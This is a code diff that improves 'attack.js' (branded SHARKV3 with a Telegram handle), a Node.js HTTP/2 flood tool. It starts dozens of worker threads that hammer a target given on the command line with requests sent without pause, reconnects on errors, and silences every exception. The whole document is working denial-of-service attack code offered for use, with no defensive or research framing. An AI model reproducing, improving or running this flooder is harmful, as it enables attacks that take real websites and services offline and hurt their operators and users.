@@ -4,6 +4,9 @@ const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
 
+process.on('uncaughtException', () => {});
+process.on('unhandledRejection', () => {});
+
 const THREADS = 16;
 const INITIAL_CONNECTIONS = 30;
 const POWER_MULTIPLIER = 3;
@@ -16,6 +19,9 @@ let errorCount = 0;
 let maxRps = 0;
 let rpsLastSecond = 0;
 
+const LOCAL_PORT = Math.floor(10000 + Math.random() * 50000);
+let endTimestamp;
+
 if (isMainThread) {
     if (process.argv.length < 4) {
         console.error('Usage: node attack.js <target> <duration_secs>');
@@ -25,20 +31,25 @@ if (isMainThread) {
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
 
+    endTimestamp = Date.now() + duration * 1000;
+
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
     console.log(`SHARKV3! - NO CPU WARMUP .exx`);
+    console.log(`PORT: ${LOCAL_PORT}`);
 
-    
     for (let i = 0; i < THREADS; i++) {
-        new Worker(__filename, { workerData: { target, duration, initial: true } });
+        new Worker(__filename, {
+            workerData: { target, duration, initial: true, port: LOCAL_PORT }
+        });
     }
 
     for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-        new Worker(__filename, { workerData: { target, duration, initial: false } });
+        new Worker(__filename, {
+            workerData: { target, duration, initial: false, port: LOCAL_PORT }
+        });
     }
 
-    // Live Stats
     setInterval(() => {
         maxRps = Math.max(maxRps, rpsLastSecond);
         renderStats();
@@ -65,14 +76,18 @@ if (isMainThread) {
             else if (msg === 'err') errorCount++;
         });
     });
-    server.listen(9999);
+    server.listen(LOCAL_PORT);
 } else {
-    const { target, duration, initial } = workerData;
+    const { target, duration, initial, port } = workerData;
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
     const end = Date.now() + duration * 1000;
 
-    const socket = net.connect(9999, '127.0.0.1');
-    const sendStat = msg => socket.write(msg);
+    const socket = net.connect(port, '127.0.0.1');
+    const sendStat = msg => {
+        try {
+            socket.write(msg);
+        } catch {}
+    };
 
     function sendLoop(client, inflight) {
         if (Date.now() > end || client.destroyed) return;
@@ -100,7 +115,7 @@ if (isMainThread) {
             }
         }
 
-        setTimeout(() => sendLoop(client, inflight), 0); // no delay between calls
+        setTimeout(() => sendLoop(client, inflight), 0);
     }
 
     function createConnection() {
@@ -113,15 +128,18 @@ if (isMainThread) {
             const inflight = { count: 0 };
 
             client.on('error', () => {
-                client.destroy();
-                setTimeout(createConnection, 1000); // auto-recover fast
+                try { client.destroy(); } catch {}
+                setTimeout(createConnection, 1000);
             });
 
-            client.on('goaway', () => client.close());
+            client.on('goaway', () => {
+                try { client.close(); } catch {}
+            });
+
             client.on('close', () => setTimeout(createConnection, 1000));
 
             client.on('connect', () => {
-                for (let i = 0; i < 1500; i++) sendLoop(client, inflight); // boosted request flow
+                for (let i = 0; i < 1500; i++) sendLoop(client, inflight);
             });
         } catch {
             setTimeout(createConnection, 1000);
